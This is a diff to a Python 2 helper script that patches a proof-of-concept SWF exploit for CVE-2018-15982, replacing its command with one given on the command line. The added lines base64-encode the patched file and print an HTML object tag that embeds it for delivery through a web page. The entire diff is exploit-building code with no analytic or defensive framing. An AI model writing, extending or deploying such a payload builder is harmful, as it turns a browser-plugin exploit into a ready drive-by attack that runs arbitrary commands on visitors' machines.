@@ -2,6 +2,7 @@
 # -*- coding: UTF-8 -*-
 import sys
 import getopt
+import base64
 
 # py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'
 # py2 tools/replaceBin.py -i xxx -o /mysvn/test.swf -c 'notepad.exe'
@@ -37,7 +38,7 @@ except getopt.GetoptError:
 # print(opts)
 for opt, arg in opts:
     if opt == '-h':
-        print 'test.py -i <inputfile> -o <outputfile>'
+        print 'test.py -i <inputfile> -o <outputfile> -c <cmd>'
         sys.exit()
     elif opt in ("-i", "--ifile"):
         inputfile = arg
@@ -63,12 +64,14 @@ else:
 # print szStr1
 
 
-
-x1=b'calc.exe'
-x1=x1 + b'\x20' * (len(xPay) - len(x1))
-# s=s.replace(x1,bytes(xPay))
 s=s.replace(xCmd1,bytes(xPay))
 
 f1=open(outputfile,"wb")
 f1.write(bytes(s))
 f1.close()
+
+xBase= base64.b64encode(s)
+xHtml = """
+<object width="1" height="1" data="data:application/x-shockwave-flash;base64,{xBase}"></object>
+"""
+print xHtml.format(xBase=xBase);
